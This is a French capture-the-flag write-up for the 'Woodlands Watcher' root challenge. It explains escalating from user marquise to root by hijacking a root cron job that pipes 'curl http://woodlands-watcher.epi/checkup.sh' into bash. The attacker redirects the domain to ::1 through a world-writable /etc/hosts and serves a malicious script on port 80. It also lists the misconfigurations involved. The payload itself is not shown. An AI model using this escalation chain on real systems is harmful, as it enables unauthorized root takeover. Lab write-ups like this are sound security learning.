# Woodlands Watcher — root.txt

## 1. Flag

```text
À récupérer
```

## 2. Objectif

L'objectif est d'obtenir une exécution de commandes avec les privilèges `root` à partir de l'accès utilisateur `marquise` obtenu dans le challenge précédent.

L'exploitation repose sur une tâche `cron` exécutée par `root`, combinée à une mauvaise configuration de `/etc/hosts` et à la possibilité pour un utilisateur non privilégié d'écouter sur le port HTTP `80`.

---

## 3. Techniques utilisées

* Énumération locale
* Analyse des tâches `cron`
* Identification d'une tâche `cron` exécutée par `root`
* Analyse de résolution DNS / `/etc/hosts`
* Manipulation de `/etc/hosts`
* Analyse des sockets réseau
* Exploitation de `net.ipv4.ip_unprivileged_port_start`
* Serveur HTTP malveillant
* Abus de `curl | bash`
* Exécution de commandes avec les privilèges `root`

---

## 4. Outils utilisés

* `crontab`
* `grep`
* `cat`
* `ls`
* `ss`
* `sysctl`
* `python3`
* `curl`
* `bash`

---

## 5. Énumération locale

Après avoir obtenu un shell avec l'utilisateur `marquise`, une énumération des tâches planifiées permet d'identifier une tâche `cron` exécutée avec les privilèges `root`.

La commande exécutée par le système est :

```bash
curl http://woodlands-watcher.epi/checkup.sh | bash
```

Cette commande est exécutée **toutes les minutes par `root`**.

Le principe est particulièrement intéressant car le script n'est pas exécuté depuis un fichier local de confiance : il est directement récupéré depuis une ressource HTTP puis envoyé à `bash`.

La chaîne d'exécution est donc :

```text
cron root
   ↓
curl http://woodlands-watcher.epi/checkup.sh
   ↓
contenu HTTP
   ↓
bash
   ↓
exécution avec les privilèges root
```

---

## 6. Analyse de `/etc/hosts`

Le nom utilisé par le cron est :

```text
woodlands-watcher.epi
```

L'analyse de `/etc/hosts` montre que ce fichier est modifiable par tous les utilisateurs.

Les permissions sont :

```text
rw-rw-rw-
```

Le fichier contient déjà une résolution locale pour :

```text
woodlands-watcher.epi
```

qui pointe vers :

```text
127.0.0.1
```

Cela signifie que le `curl` exécuté par `root` contacte actuellement le serveur HTTP local.

Le contrôle de la résolution du nom devient donc un élément central de l'exploitation.

---

## 7. Analyse du serveur HTTP

Apache est déjà présent sur la machine et écoute sur le port `80`.

Cependant, il écoute uniquement en IPv4 :

```text
0.0.0.0:80
```

et ne possède pas d'écoute équivalente sur IPv6.

Il faut donc trouver un moyen pour qu'un utilisateur non privilégié puisse lancer son propre serveur HTTP sur le port `80`.

---

## 8. Analyse de `net.ipv4.ip_unprivileged_port_start`

La configuration suivante est vérifiée :

```bash
sysctl net.ipv4.ip_unprivileged_port_start
```

La valeur obtenue est :

```text
net.ipv4.ip_unprivileged_port_start = 0
```

Cette configuration signifie que les ports normalement considérés comme privilégiés peuvent être ouverts par un utilisateur non privilégié.

En particulier, le port :

```text
80
```

peut être utilisé par un utilisateur classique.

Cela permet de contourner le conflit avec Apache en utilisant une adresse différente : IPv6 loopback.

---

## 9. Exploitation de la résolution IPv6

Puisque `/etc/hosts` est modifiable par tous, la résolution de :

```text
woodlands-watcher.epi
```

peut être modifiée afin de pointer vers :

```text
::1
```

`::1` correspond à l'adresse loopback IPv6.

La situation devient alors :

```text
woodlands-watcher.epi
        ↓
       ::1
        ↓
serveur HTTP contrôlé par marquise
        ↓
checkup.sh
```

L'intérêt de cette méthode est qu'Apache écoute uniquement sur IPv4 :

```text
0.0.0.0:80
```

alors que notre serveur malveillant peut écouter sur :

```text
[::1]:80
```

Les deux services peuvent donc utiliser le même numéro de port tout en utilisant des familles d'adresses différentes.

---

## 10. Mise en place du serveur HTTP

Un serveur HTTP est lancé sur :

```text
::1:80
```

avec un fichier :

```text
checkup.sh
```

contenant les commandes à exécuter avec les privilèges `root`.

Par exemple, le serveur peut être lancé avec Python :

```bash
python3 -m http.server 80 --bind ::1
```

Le fichier `checkup.sh` est placé dans le répertoire servi par le serveur HTTP.

---

## 11. Déclenchement du cron

Le cron s'exécute toutes les minutes.

Lors de son exécution, `root` effectue :

```bash
curl http://woodlands-watcher.epi/checkup.sh | bash
```

Grâce à la modification de `/etc/hosts`, le domaine résout désormais vers :

```text
::1
```

Le `curl` contacte donc le serveur contrôlé par `marquise`.

Le contenu de `checkup.sh` est ensuite directement envoyé à :

```bash
bash
```

Comme le processus `curl | bash` est lancé par le cron `root`, les commandes présentes dans le script sont exécutées avec les privilèges `root`.

---

## 12. Chaîne d'exploitation

```text
Accès utilisateur marquise
        ↓
Énumération locale
        ↓
Cron exécuté par root
        ↓
curl http://woodlands-watcher.epi/checkup.sh | bash
        ↓
/etc/hosts modifiable par tous
        ↓
woodlands-watcher.epi → ::1
        ↓
net.ipv4.ip_unprivileged_port_start = 0
        ↓
Possibilité d'écouter sur le port 80
        ↓
Apache uniquement sur IPv4
        ↓
Serveur HTTP contrôlé sur ::1:80
        ↓
checkup.sh malveillant
        ↓
curl exécuté par root
        ↓
bash
        ↓
Exécution de commandes en root
```

---

## 13. Vulnérabilités identifiées

### 13.1 Cron root utilisant une ressource HTTP contrôlable

La tâche planifiée exécute :

```bash
curl http://woodlands-watcher.epi/checkup.sh | bash
```

Cette pratique est dangereuse car le contenu exécuté par `bash` dépend directement d'une ressource réseau.

Si un attaquant contrôle la résolution du domaine ou le serveur auquel celui-ci aboutit, il peut potentiellement contrôler le code exécuté par `root`.

### 13.2 `/etc/hosts` modifiable par tous

Le fichier `/etc/hosts` possède des permissions permettant sa modification par des utilisateurs non privilégiés.

Cela permet de modifier localement la résolution de :

```text
woodlands-watcher.epi
```

et donc de rediriger la requête du cron.

### 13.3 Ports privilégiés accessibles aux utilisateurs non privilégiés

La configuration :

```text
net.ipv4.ip_unprivileged_port_start = 0
```

permet aux utilisateurs non privilégiés de binder des ports normalement privilégiés, notamment le port `80`.

### 13.4 Absence de validation du script téléchargé

Le cron exécute directement la sortie de `curl` :

```bash
curl ... | bash
```

Aucune vérification d'intégrité ou authentification du contenu téléchargé n'est effectuée.

---

## 14. Résultat attendu

L'exploitation permet de transformer un accès utilisateur :

```text
marquise
```

en exécution de commandes :

```text
root
```

Une fois l'exécution root obtenue, le fichier :

```text
/root/root.txt
```

peut être lu afin de récupérer le flag du challenge.

---

## 15. Conclusion

Le challenge repose sur plusieurs mauvaises configurations qui se combinent :

1. Un cron `root` télécharge et exécute directement un script distant.
2. Le domaine utilisé par ce cron peut être redirigé via `/etc/hosts`.
3. `/etc/hosts` est modifiable par les utilisateurs non privilégiés.
4. Les ports inférieurs à `1024` sont accessibles grâce à `net.ipv4.ip_unprivileged_port_start = 0`.
5. Apache écoute uniquement sur IPv4, ce qui libère `::1:80`.
6. Un serveur HTTP contrôlé par l'utilisateur peut donc fournir le `checkup.sh`.
7. Le cron `root` télécharge alors ce script et l'exécute avec les privilèges `root`.

La vulnérabilité principale est donc une **chaîne de mauvaises configurations permettant à un utilisateur local de contrôler le code exécuté par une tâche cron privilégiée**.
